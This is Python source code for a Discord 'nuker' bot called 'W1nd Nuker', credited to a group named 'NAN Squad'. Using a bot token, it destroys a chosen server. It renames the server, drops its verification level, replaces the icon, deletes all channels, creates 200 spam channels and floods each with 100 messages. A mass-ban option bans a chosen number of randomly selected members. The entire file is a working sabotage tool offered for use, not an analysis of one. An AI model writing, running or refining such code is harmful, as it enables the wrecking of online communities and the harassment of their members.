import asyncio
import discord
import random
import os
from discord.ext import commands
import ctypes
from pystyle import Colors, Center, Colorate
import aiohttp
import json
from dataclasses import dataclass

@dataclass
class Config:
    pfp_url: str
    rename_guild: bool
    channel_names: int
    channel_name: str
    message: str
#put link img for nuke (optionañ)
config = Config(
    pfp_url="https://cdn.discordapp.com/attachments/1247721812226347111/1248484149275263088/image.png?ex=66652678&is=6663d4f8&hm=0e91e591dbf3b8ba9160012e40e4b678ac10597be318ffd2e9f978746d8b5e38&",
    rename_guild=True,
    channel_names=200,
    channel_name="",
    message=""
)

TOKEN = input("Please enter your bot token: ")
GUILD_ID = int(input("Please enter the guild ID: "))
EXEMPT_ID = input("Please enter the member ID to exempt from ban (massban): ")

intents = discord.Intents.all()

astrapy = commands.Bot(command_prefix="+", intents=intents)
astrapy.remove_command('help')

def generate_random_string(length=10):
    ascii_chars = 'Извините'
    return ''.join(random.choice(ascii_chars) for i in range(length))

def set_console_title(title):
    ctypes.windll.kernel32.SetConsoleTitleW(title)

def clear_console():
    os.system('cls' if os.name == 'nt' else 'clear')

async def delete_channels(guild):
    print("[-] Deleting Channels.")
    await asyncio.gather(*[channel.delete() for channel in guild.channels])
    print("[+] Successfully deleted all channels.")

async def create_channels(guild, num_channels, channel_name):
    print("[+] Creating Channels.")
    await asyncio.gather(*[guild.create_text_channel(name=channel_name) for _ in range(num_channels)])
    print("[+] Successfully created channels.")

async def send_messages(channel, num_messages, message):
    print("[+] Spamming Messages.")
    for _ in range(num_messages):
        try:
            await channel.send(message)
            print(f"[+] Successfully spammed message in channel {channel.name}.")
        except discord.errors.RateLimited as e:
            print(f"[!] Rate Limited in channel {channel.name}.")
            await asyncio.sleep(e.retry_after)
        except discord.errors.HTTPException as e:
            print(f"[!] Error sending message in channel {channel.name}: {e}")

async def mass_ban(guild, exempt_id, num_members):
    print(f"[+] Initiating Mass Ban for {num_members} members (excluding ID: {exempt_id}).")
    members = guild.members
    members = [m for m in members if str(m.id) != str(exempt_id)]

    to_ban = random.sample(members, min(num_members, len(members)))

    for member in to_ban:
        try:
            await member.ban(reason="Mass ban initiated by W1nd Nuker")
            print(f"[+] Successfully banned member: {member.name}#{member.discriminator}")
        except Exception as e:
            print(f"[!] Error banning member {member.name}#{member.discriminator}: {e}")

    ban_records = [{"member_id": str(member.id), "username": f"{member.name}#{member.discriminator}"} for member in to_ban]
    with open('ban_records.json', 'w') as f:
        json.dump(ban_records, f, indent=4)
    print(f"[+] Ban records saved to 'ban_records.json'.")

@astrapy.event
async def on_ready():
    clear_console()
    set_console_title("W1nd Nuker")

    banner = Center.XCenter("""
██╗    ██╗ ██╗███╗   ██╗██████╗ 
██║    ██║███║████╗  ██║██╔══██╗
██║ █╗ ██║╚██║██╔██╗ ██║██║  ██║
██║███╗██║ ██║██║╚██╗██║██║  ██║
╚███╔███╔╝ ██║██║ ╚████║██████╔╝
 ╚══╝╚══╝  ╚═╝╚═╝  ╚═══╝╚═════╝ 
                            
         by NAN Squad
     discord.gg/nansquad
    """)
    print(Colorate.Vertical(Colors.green_to_white, banner, 2))

    menu = """

     ╔═══════════════════════════════════════════════════╗
     ║ 1 nuke                                   2 massban║
     ╚═══════════════════════════════════════════════════╝
    [1] Nuke
    [2] Mass Ban
    """
    print(menu)
    choice = input("Enter your choice: ")
    if choice == "1":
        await nuke()
    elif choice == "2":
        await mass_ban(astrapy.get_guild(GUILD_ID), EXEMPT_ID, int(input("Enter number of members to ban: ")))

async def nuke():
    config.channel_name = input("Please enter the name for the channels: ")
    config.message = input("Please enter the message to spam: ")

    guild = astrapy.get_guild(GUILD_ID)
    if guild is None:
        print(f"[!] Guild with ID {GUILD_ID} not found.")
        return

    print("[/] Nuke activated ~ Preparing for the attack.")

    try:
        await guild.edit(name=generate_random_string(), verification_level=discord.VerificationLevel.none)
        print("[+] Successfully renamed the guild.")
    except Exception as e:
        print(f"[!] Error editing guild: {e}")

    if discord.VerificationLevel.none:
        print("[+] Successfully edited verification level.")

    if config.pfp_url and config.pfp_url.strip() != "":
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(config.pfp_url) as resp:
                    pfp_data = await resp.read()
                    await guild.edit(icon=pfp_data)
            print("[+] Successfully changed server PFP.")
        except Exception as e:
            print(f"[!] Error changing server PFP: {e}")

    await delete_channels(guild)
    await create_channels(guild, config.channel_names, config.channel_name)

@astrapy.event
async def on_guild_channel_create(channel):
    await send_messages(channel, 100, config.message)

@astrapy.event
async def on_guild_join(guild):
    pass

astrapy.run(TOKEN)
